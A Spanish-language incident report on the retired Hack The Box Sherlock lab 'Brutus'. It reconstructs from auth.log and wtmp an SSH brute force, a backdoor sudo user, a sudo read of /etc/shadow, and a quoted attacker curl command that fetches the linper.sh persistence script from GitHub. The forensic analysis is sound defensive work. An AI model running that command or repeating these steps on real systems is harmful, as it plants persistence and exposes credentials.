# Informe de Incidente SOC - HTB Sherlock: Brutus

**Analista:** Carlos ([@carcer21](https://github.com/carcer21))  
**Dificultad:** Very Easy | **Categoría:** DFIR / SOC (Linux Logs)  
**Estado en HTB:** Retirado (Publicación permitida)  
**Verificación de logro:** [HTB Achievement Link](https://labs.hackthebox.com/achievement/sherlock/4136907/631)

---

## 1. Resumen Ejecutivo (Qué pasó)
El **6 de marzo de 2024**, un servidor Ubuntu que alojaba el servicio Confluence sufrió un ataque de **fuerza bruta contra el servicio SSH** desde la dirección IP externa `65.2.161.68`. 
El atacante logró adivinar las credenciales del usuario `root`, inició una sesión interactiva y estableció **persistencia** creando un nuevo usuario local (`cyberjunkie`) con privilegios de administración (`sudo`). Posteriormente, accedió con dicha cuenta secundaria y descargó un toolkit de persistencia para Linux (`linper.sh`).

---

## 2. Artefactos Analizados y Metodología
* **`/var/log/auth.log` (Texto plano):** Registro de autenticaciones PAM/SSH, gestión de usuarios (`useradd`, `usermod`), sesiones (`systemd-logind`) y comandos ejecutados mediante `sudo`.
* **`/var/log/wtmp` (Binario):** Registro histórico de inicios y cierres de sesión del sistema (`utmp/wtmp`), analizado forzando la zona horaria UTC para correlacionar eventos con exactitud.

---

## 3. Línea Temporal del Incidente (UTC) y Detección

| Timestamp (UTC) | Evento Detectado | Evidencia / Comando utilizado |
| :--- | :--- | :--- |
| `2024-03-06 06:31:31` - `06:31:40` | Ráfaga de intentos fallidos por SSH desde `65.2.161.68` probando múltiples usuarios (`admin`, `backup`, `svc_account`, `root`). | `grep "sshd" auth.log \| grep "Failed"` |
| `2024-03-06 06:31:40` | **Éxito de la fuerza bruta:** Login aceptado en `root` y desconexión en el mismo segundo (comportamiento típico de herramienta automatizada como Hydra). | `grep "Accepted" auth.log` |
| `2024-03-06 06:32:44` (`06:32:45` en `wtmp`) | **Acceso manual del atacante:** El atacante inicia sesión interactiva por SSH como `root` (Sesión ID `37`, terminal `pts/1`). | `TZ=UTC python3 utmp.py wtmp` y `grep "systemd-logind" auth.log` |
| `2024-03-06 06:34:18` - `06:35:15` | **Persistencia y Escalada:** Creación del usuario `cyberjunkie` y adición al grupo `sudo`. | `grep -E "useradd\|usermod" auth.log` |
| `2024-03-06 06:37:24` | El atacante cierra su primera sesión SSH como `root`. | `grep "sshd" auth.log \| grep "closed"` |
| `2024-03-06 06:37:34` | El atacante inicia sesión por SSH con la cuenta backdoor `cyberjunkie`. | `grep "cyberjunkie" auth.log` |
| `2024-03-06 06:39:38` | **Ejecución con privilegios:** Uso de `sudo` para leer `/etc/shadow` y descargar el script de persistencia `linper.sh` mediante `curl`. | `grep "sudo:" auth.log` |

**Comando malicioso detectado:**
```bash
/usr/bin/curl [https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh](https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh)
